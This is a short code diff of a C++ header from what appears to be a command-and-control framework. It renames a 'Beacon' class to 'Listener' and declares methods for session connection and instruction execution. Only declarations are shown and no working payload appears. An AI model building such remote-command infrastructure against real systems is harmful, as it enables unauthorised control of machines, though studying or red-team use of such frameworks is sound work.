@@ -17,17 +17,23 @@
 #include "C2Message.pb.h"
 
 
-class Beacon
+class Listener
 {
 
 public:
-	Beacon();
-	~Beacon();
+	Listener(int idxSession);
+	~Listener();
 
-	int runTcp();
+	int connectSession();
 
 protected:
-	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+	virtual void PingPong(C2Message& c2Message, C2Message& c2RetMessage) {};
 
-	std::vector<std::unique_ptr<std::thread>> m_threadsExec;
+	bool execInstruction(std::vector<std::string>& splitedCmd, C2Message& c2Message);
+
+	int m_idxSession;
+
+private:
+	
+	
 };
